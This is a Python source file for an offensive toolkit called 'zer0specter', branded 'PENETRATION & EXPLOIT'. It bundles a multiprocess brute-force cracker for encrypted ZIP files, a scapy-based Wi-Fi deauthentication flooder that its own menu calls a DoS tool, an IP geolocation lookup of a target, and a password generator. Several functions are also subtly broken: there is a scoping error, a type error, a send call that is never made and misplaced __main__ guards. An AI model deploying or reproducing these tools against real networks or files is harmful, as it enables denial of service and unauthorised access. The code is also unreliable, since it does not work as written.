import random
import string
import pyzipper
from itertools import product
from multiprocessing import Pool, cpu_count
import sys
import requests
import time
import os
import readline
import argparse
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

#printar a logo bonitinha
ascii_zero = (r"""
 ________                   __                     
/\_____  \                /'__`\                   
\/____//'/'     __  _ __ /\ \/\ \                  
     //'/'    /'__`/\`'__\ \ \ \ \                 
    //'/'___ /\  __\ \ \/ \ \ \_\ \                
    /\_______\ \____\ \_\  \ \____/                
 ____/_______/\/____/\/_/   \/___/                 
/\  _`\                       /\ \__               
\ \,\L\_\  _____     __    ___\ \ ,_\    __  _ __  
 \/_\__ \ /\ '__`\ /'__`\ /'___\ \ \/  /'__`/\`'__\
   /\ \L\ \ \ \L\ /\  __//\ \__/\ \ \_/\  __\ \ \/ 
   \ `\____\ \ ,__\ \____\ \____\\ \__\ \____\ \_\ 
    \/_____/\ \ \/ \/____/\/____/ \/__/\/____/\/_/ 
             \ \_\                                 
              \/_/                                                                 
+----------------------------------+
|           PENETRATION &          |
|             EXPLOIT              |
+----------------------------------+              
""")
def slow_print(text, delay=0.002):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
def loading_bar(duration=2, length=30):
    sys.stdout.write("[")
    sys.stdout.flush()
    for i in range(length):
        time.sleep(duration / length)
        sys.stdout.write("█")
        sys.stdout.flush()
    sys.stdout.write("]\n")
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    slow_print(ascii_zero, 0.0008)
    print("\n")
    slow_print("Loading zer0specter framework...\n", 0.02)
    loading_bar()
    time.sleep(0.3)
    slow_print("Initializing modules...\n", 0.02)
    loading_bar()
    time.sleep(0.3)
    slow_print("Ready.\n", 0.02)
if __name__ == "__main__":
    banner()

#features
def zipcrack(argus):
    def args():
        argumentos = argparse.ArgumentParser(description="zipcracker")
        argumentos.add_argument("-l", "--letters", dest="esc1", help="add letters on password")
        argumentos.add_argument("-n", "--numbers", dest="esc2", help="add numbers")
        argumentos.add_argument("-sc", "--specialcharacters", dest="esc3", help="add specialcharacters")
        argumentos.add_argument("-s", "--size", dest="cs", help="estimated password length")
        argumentos.add_argument("-p", "--path", dest="arq", help="dir path")
        return argumentos.parse_args(argus)
    senha = ''
    def escolhas(argu):
        if argu.esc1 == 'y':
            senha += string.ascii_letters
        if argu.esc2 == 'y':
            senha += string.digits
        if argu.esc3 == 'y':
            senha += string.punctuation
        if not senha:
            print('nothing selected, ending...')
            exit()
        return senha
    def ext(sen, arq):
        try:
            with pyzipper.AESZipFile(arq, 'r') as zp:
                zp.extractall(pwd=sen.encode())
            return (sen, True)
        except:
            return (sen, False)
    def res(argu):
        for sla in product(senha, repeat=argu.cs):
            yield ''.join(sla)
    if __name__ == "__main__":
        argu = args()
        escolhas(argu)
        with Pool(cpu_count()) as pool:
            for comb, sus in pool.imap_unordered(ext, res(argu), chunksize=500):
                print(f'Testing: {comb}')
                if sus:
                    print(f'broken with: {comb}')
                    pool.terminate()
                    break
def pass_gen(argus):
    def arguments():
        parser = argparse.ArgumentParser(description="pass generator")
        parser.add_argument("-nc", "--numberchar", dest="cs", type=int, help="number of characters you password must have")
        parser.add_argument("-p", "--punctuation", dest="q1", help="did it have special character?")
        parser.add_argument("-n", "--numbers", dest="q2", help="did it have numbers?")
        parser.add_argument("-up", "--uppercase", dest="q3")
        return parser.parse_args(argus)
    argum = arguments()
    senhag = []
    senhap = string.ascii_lowercase
    if argum.q1 == 'y':
        senhap += string.punctuation
    if argum.q2 == 'y':
        senhap += string.digits
    if argum.q3 == 'y':
        senhap += string.ascii_uppercase

    for _ in range (argum.cs):
        passw = random.choice(senhap)
        senhag.append(passw)
    print ("".join(senhag))
def wifi_blackout(argus):
    def args():
        parser = argparse.ArgumentParser(description="WIFI Attack Deauth")
        parser.add_argument("-i", "--interface", dest="interface", help="WIFI interface")
        parser.add_argument("-a", "--ap", dest="bssid_ap", help="MAC from target")
        parser.add_argument("-c", "--client", dest="bssid_client", help="MAC from client")
        parser.add_argument("-n", "--count", dest="count", type=int, default=10, help="Packets count(0 for infinite)")
        parser.add_argument("--interval", dest="interval", type=float, default=0.1, help="Time between packets")
        return parser.parse_args(argus)
    def BDP(ap_mac, client_mac):
        packet = (
            RadioTap()/
            Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/
            Dot11Deauth(reason=7)
        )
        return packet
    def packetsend(packet, interface, count, interval):
        if count == 0:
            print("[INFO]Sending packets for ∞ times... CTRL+C to stop it")
            sendp(packet, iface=interface, count=count, inter=interval, loop=1, verbose=1)
        else:
            print("[INFO]Sending packets for {count} times")
            sendp(packet, iface=interface,count=count, inter=interval, verbose=1)
    def main():
        options = args()
        pkt = BDP(options.bssid_ap, options.bssid_client)
        packetsend = (pkt, options.interface, options.count, options.interval)
    if __name__ == "__main__":
        main()
def ip_locater(argus):
    def arguments():
        parser = argparse.ArgumentParser(description="ip locator")
        parser.add_argument("-ip", type=str,help="ip from target or let empty for yours")
        args = parser.parse_args()
        return args.ip
    def get_ip(ip):
        try:
            url = f"https://ipwho.is/{ip[1]}"
            print(f"[DEBUG] URL gerada: {url}")
            resposta = requests.get(url)
            if resposta.status_code == 200:
                return resposta.json()
            else:
                return {"error": f"Falha na requisição, status: {resposta.status_code}"}
        except Exception as e:
            return {"error": str(e)}
    def main():
        arguments()
        result = get_ip(argus)
        if "error" in result:
            print(f"Erro: {result['error']}")
        else:
            print("""-----result-----""")
            print(f"IP: {result.get('ip')}")
            print(f"Country: {result.get('country')}")
            print(f"Region: {result.get('region')}")
            print(f"City: {result.get('city')}")
            print(f"Providor (ISP): {result.get('isp')}")
            print(f"Type: {result.get('type')}")
            print(f"Latitude: {result.get('latitude')}")
            print(f"Longitude: {result.get('longitude')}")
    if __name__ == "__main__":
        main()

#execução
FEATURES = {
    "zipcrack": (zipcrack, "Crack password-protected zip files"),
    "passgen": (pass_gen, "Generate random secure passwords"),
    "wifiblackout": (wifi_blackout, "A DoS tool for network attacks")
}

def show_help():
    print("\nAvailable commands:")
    for feat, (_, desc) in FEATURES.items():
        print(f"  {feat:<12} {desc}")
    print("  help         Show this message")
    print("  quit/exit    Exit the program\n")

def main():
    while True:
        userin = input("[Zer0Specter] > ").lower()
        partes = userin.split()
        feature = partes[0]
        argumentos = partes[1:]
        if feature == "zipcrack":
            try:
                zipcrack(argumentos)
            except SystemExit:
                print("Argument not recognized. Use '--help' for this command.")
            except argparse.ArgumentError:
                print("sintaxe error")
        if feature == "passgen":
            try:
                pass_gen(argumentos)
            except SystemExit:
                print("Argument not recognized. Use '--help' for this command.")
            except argparse.ArgumentError:
                print("sintaxe error")
        if feature == "wifiblackout":
            try:
                wifi_blackout(argumentos)
            except SystemExit:
                print("Argument not recognized. Use '--help' for this command.")
            except argparse.ArgumentError:
                print("sintaxe error")
        if feature == "iplocator":
            try:
                ip_locater(argumentos)
            except SystemExit:
                print("Argument not recognized. Use '--help' for this command.")
            except argparse.ArgumentError:
                print("sintaxe error")
        if feature in ["quit", "exit"]:
            print("ending...")
            time.sleep(2)
            exit()
        if feature == "clear":
            os.system('clear')
        elif feature == "help":
            show_help()
if __name__ == "__main__" :
    main()